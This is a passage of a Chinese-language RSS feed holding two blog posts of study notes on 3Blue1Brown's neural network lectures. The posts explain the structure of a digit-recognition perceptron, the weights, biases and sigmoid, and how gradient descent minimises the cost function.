&lt;p&gt;神经网络本身是个函数，它有784个输入值，10个输出，13000多个参数。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002541928-693200207.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;代价函数则要再抽象一层，13000多个权重和偏置值作为他的输入，输出是单个数值，表示参数的表现优劣程度。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002542226-1885758132.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;代价函数取决于网络对上万个训练数据的综合表现，但是我们还需要告诉网络该如何改变这些权重和偏置值，让其表现更好。为了简化问题，我们先不去想一个有13000多个变量的函数，而考虑简单的一元函数，只有一个输入变量，只输出一个数字。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002542587-106270123.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;学过微积分的都知道，有时你可以直接算出这个最小值，不过函数很复杂的话就不一定能写出，而我们这个超复杂的13000元的代价函数，就更加不可能做到了。一个灵活的技巧是：以下图为例，先随便挑一个输入值，找到函数在这里的斜率，斜率为正就向左走，斜率为负就向右走，你就会逼近函数的某个局部最小值。（其实是沿着负梯度方向，函数减少的最快）&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002542931-758196295.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;但由于不知道一开始输入值在哪里，最后你可能会落到许多不同的坑里，而且无法保证你落到的局部最小值就是代价函数的全局最小值。值得一提的是，如果每步的步长与斜率成比例，那么在最小值附近斜率会越来越平缓，每步会越来越小，这样可以防止调过头。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002543723-1642845118.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们想象一个更复杂的两个输入一个输出的二元函数，代价函数是图中右侧的红色曲面。在输入空间被沿着哪个方向走，才能使输出结果下降最快？&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002545058-1428488497.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在多元微积分领域，函数梯度指的是函数的最陡增长方向，沿着其相反的方向，函数值下降的最快，梯度向量的长度代表了最陡的斜坡的到底有多陡峭。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002545383-1057891152.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;让函数值最小的算法其实就是先计算梯度，在按反方向走一小步，然后循环。处理13000个输入的函数也是这个道理。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002545998-47955880.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;只是把这些权重、偏置都放在一个列向量中，代价函数的负梯度也是一个向量。负梯度指出了在这个函数输入空间内，具体如何改变每一项参数，才能让让代价函数的值下降的最快。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002546476-1618497594.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;对于这个我们设计的神经网络的代价函数，更新权重和偏置来降低代价函数的值，意味着输入训练集的每一份样本的输出，都会越来越接近真实结果。又因为我们选择的是所有训练样本代价函数的平均值，所以最小化即对所有样本得到的总体结果会更好。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002547359-287879576.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当我们提到让网络学习，实质上就是让代价函数的值最小。代价函数有必要是平滑的，这样我们才可以挪动以找到全局最小值，这也就是为什么人工神经元的激活值是连续的。到这里，我们终于引出了梯度下降法的定义：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002547905-2005704857.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;负梯度内每一项值的正负号告诉我们输入向量对应该调大还是调小，每一项的相对大小也告诉了我们哪个值影响更大，改变哪个参数值，性价比最高。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002548228-995134732.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;训练后的神经网络就可以进行数字识别了，但是当输入是一个噪音图片时，神经网络却仍很自信的把它识别成一个数字。换句话说，即使网络学会了如何识别数字，但是它却不会自己写数字。原因就在于网络的训练被限制在很窄的框架内，对于第一层网络，它的视角整个宇宙都是由小网格内清晰定义的静止数字组成的，它的代价函数则会促使它对最后的判断有绝对的自信。研究越深，你就会发现，神经网络没有那么智能。&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190817002549299-288090755.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;本节完！下节课我们学习3Blue1Brown关于神经网络的第3部分《偏导数和反向传播法》。&lt;/p&gt;
</description>
<pubDate>Fri, 16 Aug 2019 16:26:00 +0000</pubDate>
<dc:creator>jpld</dc:creator>
<og:description>本文为3Blue1Brown神经网络课程讲解第二部分《Gradient descent, how neural networks learn 》的学习笔记，观看地址：www.bilibili.com/</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jpld/p/11366996.html</dc:identifier>
</item>
<item>
<title>100天搞定机器学习|Day35 深度学习之神经网络的结构 - jpld</title>
<link>http://www.cnblogs.com/jpld/p/11366811.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jpld/p/11366811.html</guid>
<description>&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648929809&amp;amp;idx=1&amp;amp;sn=6583853472779ddde813391c186e49be&amp;amp;chksm=8794e43bb0e36d2d97bd2200a74e4ef70072afadb3df646131c3bb2522274b87ee3fc049a444&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day1数据预处理&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648929825&amp;amp;idx=1&amp;amp;sn=87d68cf2b67569905662f5cee6de2412&amp;amp;chksm=8794e40bb0e36d1df52991e60ac433f56135d14799f2d1e638d2159a4f5e54ab7b53a384f080&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day2简单线性回归分析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648929849&amp;amp;idx=1&amp;amp;sn=d5662bf397f9621f4afbb271e661927a&amp;amp;chksm=8794e413b0e36d05ea5a9bd40f3a585dcefc0b4c1abddbd562b16c92fabebe237be21548a848&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day3多元线性回归&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648929868&amp;amp;idx=1&amp;amp;sn=5807d7ddc97088f0322d005c2a611e74&amp;amp;chksm=8794e466b0e36d7027d6dcbe3b536228b97b96f74656dfb62f816495e1933473eddab5c5c1a2&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day4-6 逻辑回归&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648929908&amp;amp;idx=1&amp;amp;sn=d286fb7b6137cdd38f8da1a442e059f0&amp;amp;chksm=8794e45eb0e36d4827b8a15bb69e80e4a1fea358fccda510e03e078ad5479324b3cf91807173&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day7 K-NN&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648929948&amp;amp;idx=2&amp;amp;sn=1c2f6263a8ac56b1837e730c2141a474&amp;amp;chksm=8794e4b6b0e36da09a505525b8608736e94f6ea00cd20cee0dc7158291f2338c21411f4bfd39&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day8 逻辑回归的数学原理&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648929952&amp;amp;idx=1&amp;amp;sn=642aab66caac7bbc7dd781ad9e45c325&amp;amp;chksm=8794e48ab0e36d9c3dc90350d79faf52e50b978a6c0ea99a0b93460f4eae416b4a94ea6de90f&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day9-12 支持向量机&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648929957&amp;amp;idx=1&amp;amp;sn=b1c4268bb60bde35da5debcbfb4c5f7b&amp;amp;chksm=8794e48fb0e36d99277628ef64c0d1a8e7805cfadd7b389bed2d0eeb202e6366522b4c6e405b&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day11 实现KNN&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648929966&amp;amp;idx=1&amp;amp;sn=83935cbfd51f56cdb08f1b0444dd2e71&amp;amp;chksm=8794e484b0e36d9226594ac9ba7394d4ac2fd205baef473b4fd6d678fa2cc3e767f32d47ab9b&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day13-14 SVM的实现&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648930067&amp;amp;idx=1&amp;amp;sn=196f11b78f38b2ebcb2337e126615334&amp;amp;chksm=8794e539b0e36c2fbd97ee475215eb55acdcad85c8c462f495b008eb30b55ed1422f306f82a3&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day15 朴素贝叶斯&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648930244&amp;amp;idx=1&amp;amp;sn=a2a26eba9293c5c2416ccd17d6676ab5&amp;amp;chksm=8794e5eeb0e36cf8794747a30b8b6cee98db056e9eb62cc075860ed0062b6ef6dc6d5ae81b2e&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day16 通过内核技巧实现SVM&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648930288&amp;amp;idx=1&amp;amp;sn=9a70bd64ee2033de479ca73f6a118529&amp;amp;chksm=8794e5dab0e36ccc55269d73f810e5dcf8877ee70688e45ecb8fb82b2d48fcd47fe8739a5960&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day17-18  神奇的逻辑回归&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648930262&amp;amp;idx=1&amp;amp;sn=9d9ba4967c125c3c3fdfa1f852a52663&amp;amp;chksm=8794e5fcb0e36cea0f26491280047d0c8ee164e72ab163553c9e68d8885112aec97c3d418f28&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day19-20 加州理工学院公开课：机器学习与数据挖掘&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648930417&amp;amp;idx=1&amp;amp;sn=7d95a463c2296ca470b059fde68d7abc&amp;amp;chksm=8794ea5bb0e3634dbd3712d3080cfdc9d2eaca7d3798bc8b22d627cfc3cb4ee4891414c10caf&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day21 Beautiful Soup&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648930417&amp;amp;idx=2&amp;amp;sn=e5b05e7af739ae3a2df3ad8531bbea51&amp;amp;chksm=8794ea5bb0e3634d5d5e909484d5e61a0ce1dc2a6e7453c18c6f2145b70e810f87ec162d2e39&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day22 机器为什么能学习？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648930417&amp;amp;idx=3&amp;amp;sn=d50d29d04b787aafcb48ca742f650deb&amp;amp;chksm=8794ea5bb0e3634d9768b3ed39245ff585bfae895c888ec119fd924bc43dd062e09e6c814bd6&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day23-25 决策树及Python实现&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648930417&amp;amp;idx=4&amp;amp;sn=0459230c87aef2b3fdc6498971faf205&amp;amp;chksm=8794ea5bb0e3634d8e6b6c58229d81a5782c52df678ccbb894713603341a58c6b8d65b285b0e&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day26-29 线性代数的本质&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648930417&amp;amp;idx=5&amp;amp;sn=951ffd6b919d03c85a988094cb1edb62&amp;amp;chksm=8794ea5bb0e3634d404a5953e4098a7d214e8c16d6d4a3c7d0f2e712b51d79c164360d4536d4&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day 30-32 微积分的本质&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648930523&amp;amp;idx=2&amp;amp;sn=2233b72afa4758265e01f0c0aaafe264&amp;amp;chksm=8794eaf1b0e363e7c182dd9edf9f50cb143e8baed7de3c6ea8f40c6b2fbe0085fb0ad965c837&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day33-34 随机森林&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文为3Blue1Brown之《What is a Neural Network?》学习笔记&lt;/p&gt;
&lt;p&gt;观看地址：bilibili.com/video/av15532370&lt;/p&gt;
&lt;p&gt;这集Grant大佬假设大家都没有神经网络的基础，为新手讲解神经网络基本概念，让大家再听说神经网络学习的时候，可以明白究竟是什么意思。大佬选择经典的多层感知器（MLP）结构解决手写数字识别问题，理由是理解了经典原版，才能更好地理解功能强大的变种，比如CNN和LSTM。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先看看神经元和他们是怎么连接的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;神经元可以理解为一个装着0到1之间数字的容器。以28*28输入图像每一个像素为例，每一个原点都是一个神经元，其中数字代表对于像素的灰度值，0表示纯黑，1表示纯白，这个数字在神经网络里称作“激活值”。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231000495-667850648.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这784个神经元就组成了网络的第一层，最后一层的十个神经元代表0-9这十个数，同样的，他们的激活值也在0-1之间，代表了输入图像对应哪个数字的可能性。网络中间层被称为隐含层，可以看做黑箱，数字识别的具体工作就在这里完成，这里加了两层隐含层，每层有16个神经元——随便设置的，只是为了显得好看，后期还可以再调整。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231000840-738342642.png&quot; alt=&quot;image.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;神经网络处理信息的核心机制正是如此，一层的激活值通过一定的运算，得出下一层的激活值。上面也提到784个神经元代表的是数字图案，那么下一层激活值也会产生某些特殊的图案，最终在输出层最亮的神经元表示神经网络的选择。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231001906-653964055.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们再看看如何训练，为什么这种层状结构就能识别数字呢？&lt;/p&gt;
&lt;p&gt;我们可以把数字进行拆解，理想状况下希望倒数第二层的各个神经元可以分别对应上一个笔画。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231002529-1019239090.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再来看隐含层第一层，当输入为9或8的上面带圈的数字时，某个神经元的激活值就会接近1，希望所有这种位于图像顶部的圆圈图案都能点亮这个神经元，这样，从第三次到输出层，我们只需要学习哪些部件能组合出哪个数字即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231004296-1688127926.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;但是如何识别圆圈呢？同理可以把它拆分成更细微的问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231004577-528607735.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;于是我们希望网络第二层的各个神经元对应这些短边，第二层就能把所有关联短边的八到十个神经元都点亮，接着就能点亮对于顶部圆圈和长竖条的神经元。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231004817-173271646.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;然后我们看看连线的作用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如何让第二层（隐含层的第一层）中的这一个神经元能够能够识别出图像的这一块区域是否存在一条边？&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231005776-640435686.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们设计让第二层的某一个神经元能正确识别图像中的这块区域里是否存在一条边。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231006576-684981832.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们拿出第一层（输入层/第0层）的激活值，并赋上权重（要关注区域的权重为正值，否则为0），这样对所有像素值求加权和，就只会累加关注区域的像素值了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231007146-1078607442.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;绿色为正值，红色为负值，颜色越暗表示权重越接近0&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231007954-446556544.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;所以想要识别是否存在一条边，只需要给周围一圈的像素都赋予负权重&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231008520-1503467325.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;计算的加权值可以使任意大小的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231008961-1202771415.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;但是我们需要的是将其压缩到0-1之间&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231009267-373911065.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里就需要Sigmoid函数了，这就是激活函数。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231009844-1672387027.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;激活值实际上就是一个对加权之和到底有多正的打分，但是有时加权之和大于0时，也不想点亮神经元，比如想要加权和大于10时才让他激发，这里就还需要加上一个偏置值，保证不随便激发。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231010502-2041895455.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;权重告诉我们第二个神经元关注什么样的像素图案&lt;/p&gt;
&lt;p&gt;bias告诉我们加权和要多大才能让神经元的激发有意义&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231010859-1866033186.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里有13000多个参数需要调整，所以这里所谓的学习就是找到正确的权重和偏置。刚开始讲到我们把神经元看作是数字容器，但是这些数字取决于输入的图像，所以把神经元看过一个函数才更准确，它的输入是上一层所有神经元的输出，它的输出是一个0-1之间的值。其实整个神经网络也是一个函数，输入784个值，输出10个值。不过它是一个包含了13000个权重、偏置参数的极其复杂的函数。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231012011-1627296046.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231012962-1070846994.png&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;需要注意的是，机器学习尤其是神经网络运算与线性代数是密不可分的，之前有过介绍，请移步：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjYwMTc5Nw==&amp;amp;mid=2648930417&amp;amp;idx=4&amp;amp;sn=0459230c87aef2b3fdc6498971faf205&amp;amp;chksm=8794ea5bb0e3634d8e6b6c58229d81a5782c52df678ccbb894713603341a58c6b8d65b285b0e&amp;amp;scene=21#wechat_redirect&quot;&gt;100天搞定机器学习|Day26-29 线性代数的本质&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231013810-1754573006.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;神经网络中需要大量的矩阵乘法和sigmoid映射运算&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231014932-670021514.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这种运算方式，非常适合编程，比如可以用Python的numpy很简单的实现。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231015994-750622160.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后需要一提的是，现在神经网络基本不再使用sigmoid了，比较流行的是ReLU（线性整流函数）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/743008/201908/743008-20190816231016241-273379031.jpg&quot; alt=&quot;image&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 16 Aug 2019 15:10:00 +0000</pubDate>
<dc:creator>jpld</dc:creator>
<og:description>'100天搞定机器学习|Day1数据预处理' '100天搞定机器学习|Day2简单线性回归分析' '100天搞定机器学习|Day3多元线性回归' '100天搞定机器学习|Day4 6 逻辑回归' '1</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jpld/p/11366811.html</dc:identifier>
</item>
</channel>
</rss>